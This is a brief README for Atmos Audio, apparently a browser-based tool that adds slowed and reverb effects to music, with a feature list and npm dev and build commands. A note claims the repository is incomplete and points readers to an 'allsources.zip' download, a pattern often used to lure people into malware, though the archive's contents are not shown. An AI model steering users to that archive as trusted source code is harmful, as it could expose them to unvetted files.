# Atmos Audio
Atmos Audio is a client-side web utility for adding a warm slowed and reverb atmosphere to uploaded music.

## Features

- Upload MP3, WAV, M4A, AAC, OGG, FLAC, and similar audio files
- Apply a softer slowed and echo preset without chorus-style robotic artifacts
- Preview the original and processed versions separately
- Download the processed audio file

> [!NOTE]
> ***Not all files have been uploaded to GitHub*** due to some internal errors, so a ZIP archive with the full code has been uploaded to the repository. ( [download zip](https://github.com/lordofsunshine/atmosaudio/blob/main/allsources.zip) )

## Development

```bash
npm install
npm run dev
```

The dev server runs at `http://127.0.0.1:5173`.

## Build

```bash
npm run build
```
